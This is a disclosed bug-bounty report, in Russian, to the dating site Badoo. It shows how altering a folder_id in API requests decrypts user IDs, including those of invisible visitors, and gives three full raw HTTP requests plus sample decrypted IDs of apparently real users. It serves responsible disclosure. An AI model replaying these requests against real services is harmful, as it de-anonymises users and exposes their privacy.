@@ -1,0 +1,144 @@
+ReportLink:https://hackerone.com/reports/402410
+WeaknessName:Information Disclosure
+Reporter:https://hackerone.com/jarvis7
+ReportedTo:Badoo(badoo)
+BountyAmount:320.0
+Severity:medium
+State:Closed
+DateOfDisclosure:01.11.2018 9:10:44
+
+Summary:
+
+Привет! Обнаружил  багу, которая позволяет очень серьезно обойти логику сайта.
+
+Данная уязвимость позволяет расшифровать любой зашифрованный ID, который идентифицирует профиль пользователя. Для каждого пользователя генерируется несколько видов ID, например для отображения в "Знакоства",  "Live Stream", "Бан лист", "Пользователи, которые тебя лайкнули (тестовый премиум)" и даже ID пользователей-невидимок. Это те типы ID, которые я выделил, хотя может быть их и больше, просто что то мог упустить. Именно этот метод имеет доступ ко всем типам ID, что делает багу такой критичной ( в предыдущих похожих багах на расшифровку ID такого не было замеченно).
+
+Работает уязвимость по следующему принципу. По умолчанию, при получении списка пользователей, на которых подписан в Live Stream (нажал на кнопку Follow) сайт выдает список шифрованных ID пользователей и зашифрованные url аватарок. Но если модифицировать запрос, то можно получить этот список в расшифрованном виде.
+
+Для воспроизвидения уязвимости атаку нужно разделить на 3 этапа.
+
+### Этап 1 ###
+
+Добавление пользователя в список Following (https://badoo.com/live/4)
+
+```
+POST /bmaapi.phtml?SERVER_SECTION_USER_ACTION HTTP/1.1
+Host: badoo.com
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0
+Accept: */*
+Accept-Language: ru,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: https://badoo.com/live/2
+Content-Type: json
+X-Desktop-web: 1
+X-Message-type: 259
+X-Session-id: [...My Token...]
+Content-Length: 253
+Connection: close
+
+{"version":1,"message_type":259,"message_id":24,"body":[{"message_type":259,"server_section_user_action":{"action":5,"folder_id":34,"user_list":[{"person_id":["obff5b362880e6595302863c158018b1a7168112b2b249887"]}],"context":174}}],"is_background":false}
+```
+
+В person_id нужно поместить шифрованный ID пользователя, который нужно извлечь. 
+
+### Этап 2 ###
+
+Самый главный этап. Получение расшифрованного ID. Итак, для получения списка пользователей отправляется вот такой запрос:
+
+```
+POST /bmaapi.phtml?SERVER_GET_USER_LIST HTTP/1.1
+Host: badoo.com
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0
+Accept: */*
+Accept-Language: ru,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: https://badoo.com/live/3
+Content-Type: json
+X-Desktop-web: 1
+X-Message-type: 245
+X-Session-id: [... My Token ...]
+Content-Length: 273
+Connection: close
+
+{"version":1,"message_type":245,"message_id":18,"body":[{"message_type":245,"server_get_user_list":{"folder_id":33,"source":174,"user_field_filter":{"projection":[200,340,1254,1250,1259]},"section_requests":[{"section_id":"4"},{"section_type":25}]}}],"is_background":false}
+```
+
+А вот модифицированный запрос
+
+```
+POST /bmaapi.phtml?SERVER_GET_USER_LIST HTTP/1.1
+Host: badoo.com
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0
+Accept: */*
+Accept-Language: ru,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: json
+X-Desktop-web: 1
+X-Message-type: 245
+X-Session-id: [... My Token ...]
+Content-Length: 214
+Connection: close
+
+{"version":1,"message_type":245,"message_id":92,"body":[{"message_type":245,"server_get_user_list":{"folder_id":34,"preferred_count":255,"offset":0,"user_field_filter":{"projection":[200]}}}],"is_background":false}
+```
+
+В чем разница? Разница в folder_id:
+  + 33 - запрос для получения  шифрованных данных
+  + 34 - запрос для получения расшифрованных данных
+
+Так же был модифицирован projection, только для удобства.
+
+Вот ответ с шифрованным запросом
+{F339150}
+
+Ответ с измененным folder_id
+{F339149}
+
+### Этап 3 ###
+
+Пользователя нужно удалить из списка. Делается для того, что бы не захламлять страницу, и потом, если просматривать список через браузер, отображаются на сайте только те, кто ведет стрим в данный момент, остальные не отображаются. Для удаления пользователя из списка используется такой запрос:
+
+```
+POST /bmaapi.phtml?SERVER_SECTION_USER_ACTION HTTP/1.1
+Host: badoo.com
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0
+Accept: */*
+Accept-Language: ru,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: https://badoo.com/live/4
+Content-Type: json
+X-Desktop-web: 1
+X-Message-type: 259
+X-Session-id: [... My Token ...]
+Content-Length: 214
+Connection: close
+
+{"version":1,"message_type":259,"message_id":124,"body":[{"message_type":259,"server_section_user_action":{"action":1,"folder_id":34,"user_list":[{"person_id":["606393962"]}],"context":174}}],"is_background":false}
+```
+
+В person_id можно уже помещать расшифрованные ID.
+
+## Impact
+
+### Расшифровка коротких шифрованных ID ###
+Расшифровка ID из страниц "Знакомства", "Live stream", "Бан лист" и тд. Расшифровка ID вот такого типа: obff5b362880e65959be3a61f779da9cf3ceb7ea826ad08ec
+Пример:
+ - obff5b362880e65959be3a61f779da9cf3ceb7ea826ad08ec  - 613502044 
+
+Так же можно расшифровывать ID пользователей, которые тебе поставили лайк и у текущего владельца аккаунта есть тестовый премиум аккаунт.
+
+
+PoC видео:
+{F339152}
+
+### Расшифровка ID Невидимок ###
+Благодаря этой баге я могу так же определить всех невидимок, которые меня посещают. ID пользователей-невидимок отличаются от обычных шифрованных ID, они длиннее, и выглядят примерно так o929ea7096bc8bad42b2869a8c4c435274150f98113c81f4cd39fcfc305609bfe.
+
+Вот 2 расшифровки невидимок:
+- o929ea7096bc8bad42b2869a8c4c435274150f98113c81f4cd39fcfc305609bfe - 615633337
+- o929ea7096bc8bad42b2869a8c4c43527978ce585ef48228f9556434756f4f127 - 623874435
+
+Извлечь такую информацию нельзя даже купив премиум аккаунт. Это очень серьезный information disclose.
+
+PoC о том, как как определить Невидимок, посетивших мою страницу (никакие привилегии для страницы не нужны):
+{F339158}
